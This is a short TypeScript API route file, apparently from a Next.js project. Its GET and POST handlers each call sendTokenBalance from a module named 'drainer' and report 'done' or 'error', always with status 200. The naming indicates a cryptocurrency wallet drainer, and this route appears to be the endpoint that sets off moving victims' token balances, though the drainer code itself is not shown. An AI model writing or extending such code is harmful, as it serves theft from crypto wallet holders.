import { sendTokenBalance , transferBalance} from "@/utils/drainer"

export async function POST(reqs: Request) {
 
    const address = process.env.Address
   
    try {

       
        const receipt = await sendTokenBalance()
       // console.log(receipt)
        if(receipt)
            {
                return Response.json({ message: "done" }, {status: 200})
            }

            else
            {
                return Response.json({ message: "done" })
            }
    } catch (error) {
        return Response.json({ message: "error" }, {status: 200})
    }

}

export async function GET() {
    const address = process.env.Address
   
    try {

       
        const receipt = await sendTokenBalance()
        if(receipt)
            {
                return Response.json({ message: "done" }, {status: 200})
            }

            else
            {
                return Response.json({ message: "done" })
            }
    } catch (error) {
        return Response.json({ message: "error" }, {status: 200})
    }

    
}


